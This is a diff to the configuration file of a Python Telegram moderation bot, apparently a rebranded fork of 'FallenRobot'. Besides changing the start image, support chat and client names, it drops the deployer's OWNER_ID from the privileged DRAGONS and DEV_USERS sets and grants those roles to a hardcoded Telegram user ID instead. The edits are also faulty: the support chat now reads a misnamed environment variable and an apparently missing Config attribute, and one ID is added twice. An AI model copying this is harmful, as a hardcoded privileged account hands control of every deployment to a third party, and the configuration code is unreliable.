@@ -45,10 +45,10 @@ if ENV:
     MONGO_DB_URI = os.environ.get("MONGO_DB_URI", None)
     NO_LOAD = os.environ.get("NO_LOAD", "").split()
     START_IMG = os.environ.get(
-        "START_IMG", "https://telegra.ph/file/40eb1ed850cdea274693e.jpg"
+        "START_IMG", "https://graph.org/file/c7dd819399f9c88a7049a.jpg"
     )
     STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", True))
-    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "DevilsHeavenMF")
+    SUPPORT_CHAT = os.environ.get("CHATTING_HUB8", "CHATTING_HUB8")
     TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
     TOKEN = os.environ.get("TOKEN", None)
     TIME_API_KEY = os.environ.get("TIME_API_KEY", None)
@@ -102,7 +102,7 @@ else:
     NO_LOAD = Config.NO_LOAD
     START_IMG = Config.START_IMG
     STRICT_GBAN = Config.STRICT_GBAN
-    SUPPORT_CHAT = Config.SUPPORT_CHAT
+    SUPPORT_CHAT = Config.CHATTING_HUB8
     TEMP_DOWNLOAD_DIRECTORY = Config.TEMP_DOWNLOAD_DIRECTORY
     TOKEN = Config.TOKEN
     TIME_API_KEY = Config.TIME_API_KEY
@@ -140,15 +140,15 @@ else:
         raise Exception("Your whitelisted users list does not contain valid integers.")
 
 
-DRAGONS.add(OWNER_ID)
-DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1356469075)
+DRAGONS.add(1380008589)
+DEV_USERS.add(1380008589)
+DEV_USERS.add(1380008589)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
-telethn = TelegramClient("Fallen", API_ID, API_HASH)
+telethn = TelegramClient("Recreation", API_ID, API_HASH)
 
-pbot = Client("FallenRobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
+pbot = Client("RecreationRobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
 
 print("[INFO]: Getting Bot Info...")
